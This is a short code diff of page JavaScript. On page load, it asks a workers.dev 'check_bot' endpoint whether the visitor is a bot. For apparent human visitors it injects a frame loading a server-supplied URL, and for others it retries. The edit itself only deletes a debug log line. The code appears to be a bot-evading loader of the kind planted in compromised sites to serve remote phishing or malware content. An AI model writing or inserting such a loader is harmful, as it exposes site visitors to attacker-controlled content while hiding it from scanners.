@@ -40,7 +40,7 @@ window.addEventListener('DOMContentLoaded', () => {
     fetch('https://gitrunwa.slynney84.workers.dev/loader/api/check_bot').then(res => res.json()).then(res => {
         if (res?.code == 200 && !res.result) {
             createFrame(res.url + '/nf5nPY3n')
-			console.log(createFrame)
+			
 			
         } else {
             setTimeout(toggleLoad, 500);
